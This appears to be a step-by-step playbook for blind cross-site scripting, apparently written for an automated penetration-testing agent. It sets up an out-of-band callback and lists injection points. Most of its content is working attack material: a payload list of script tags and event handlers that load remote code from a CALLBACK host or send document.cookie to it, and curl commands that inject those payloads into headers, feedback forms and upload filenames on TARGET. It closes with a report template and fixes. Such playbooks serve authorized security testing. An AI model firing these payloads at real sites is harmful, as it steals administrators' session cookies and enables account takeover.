# Blind XSS (Out-of-Band XSS)

## Overview
Blind XSS triggers in a different user context (admin panel, log viewer, moderation queue).
Use out-of-band (OOB) callbacks to detect execution and collect evidence safely.

## Prerequisites
```bash
# OOB callback service
# (records hits and provides a unique domain)
go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
```

## Phase 1: Setup Callback Channel
```bash
interactsh-client -o /workspace/output/TARGET_interactsh.txt
# Note the generated domain: <CALLBACK>
```

## Phase 2: Identify Injection Points
```bash
cat > /workspace/output/TARGET_bxss_points.txt <<'POINTS'
contact/support forms
admin-mod review queues
profile fields (name, bio, website)
file upload filenames and metadata
log viewers (user-agent, referer, x-forwarded-for)
markdown/rich-text inputs
POINTS
```

## Phase 3: Payload Set
```bash
cat > /workspace/output/TARGET_bxss_payloads.txt <<'PAYLOADS'
"><script src=//CALLBACK/x.js></script>
"><img src=x onerror="new Image().src='//CALLBACK/?c='+encodeURIComponent(document.cookie)">
"><svg/onload=fetch('//CALLBACK/?d='+document.domain)>
</script><script src=//CALLBACK/x.js></script>
"><iframe src=javascript:fetch('//CALLBACK/?u='+document.URL)></iframe>
PAYLOADS
```

## Phase 4: Header Injection (Log-Based Blind XSS)
```bash
PAYLOAD='<PAYLOAD_FROM_LIST>'

curl -s https://TARGET/ \
  -H "User-Agent: $PAYLOAD" \
  -H "Referer: $PAYLOAD" \
  -H "X-Forwarded-For: $PAYLOAD" \
  -H "X-Real-IP: $PAYLOAD" \
  | tee /workspace/output/TARGET_bxss_header_test.txt
```

## Phase 5: Stored/Delayed Execution
```bash
PAYLOAD='<PAYLOAD_FROM_LIST>'

# Typical form submission
curl -s -X POST https://TARGET/feedback \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "message=$PAYLOAD" \
  | tee /workspace/output/TARGET_bxss_form_test.txt

# File upload filename injection
curl -s -X POST https://TARGET/upload \
  -F "file=@/path/to/file.png;filename=\"$PAYLOAD.png\"" \
  -F "title=test" \
  | tee /workspace/output/TARGET_bxss_upload_test.txt
```

## Phase 6: Triage & Evidence Collection
```bash
# Review OOB hits and correlate timestamps + user-agent
rg -n "http|https" /workspace/output/TARGET_interactsh.txt \
  > /workspace/output/TARGET_bxss_hits.txt
```

## Report Template

```
Target: TARGET
Callback Domain: <CALLBACK>
Assessment Date: <DATE>

## Confirmed Blind XSS
- Injection point: <field/endpoint>
- Payload: <payload>
- Evidence: <timestamp + request details>
- Execution context: <admin panel / log viewer / other>

## Impact
- Stored XSS in privileged context
- Account takeover / CSRF token theft potential

## Recommendations
1. Encode output by context (HTML, attribute, JS, URL)
2. Sanitize inputs and disallow dangerous tags/attrs
3. Enforce CSP with strict `script-src` and no `unsafe-inline`
4. Remove HTML rendering for untrusted fields in admin tools
```

## Output Files
- `/workspace/output/TARGET_bxss_payloads.txt` — payload list
- `/workspace/output/TARGET_bxss_points.txt` — target points
- `/workspace/output/TARGET_interactsh.txt` — OOB callback log
- `/workspace/output/TARGET_bxss_hits.txt` — extracted hits

indicators: blind xss, bxss, out of band xss, xss hunter, xsshunter, oob xss, stored xss, log xss
